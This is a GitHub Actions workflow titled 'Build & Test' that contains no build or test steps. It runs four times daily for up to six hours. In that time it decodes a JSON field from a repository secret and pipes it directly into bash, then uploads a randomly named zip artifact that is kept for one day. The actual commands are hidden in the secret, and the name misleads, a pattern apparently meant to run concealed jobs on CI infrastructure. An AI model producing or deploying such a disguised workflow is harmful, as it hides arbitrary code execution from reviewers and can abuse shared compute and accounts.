name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '34 2,8,14,20 * * *'
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          t1: ${{ secrets.t1 }}
        run: |
          printf '%s' "$t1" | jq -r .c964 | /bin/bash
          echo $kdu7 | jq -r .edl53 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: lAS9vVML
          path: "*.zip"
          retention-days: 1
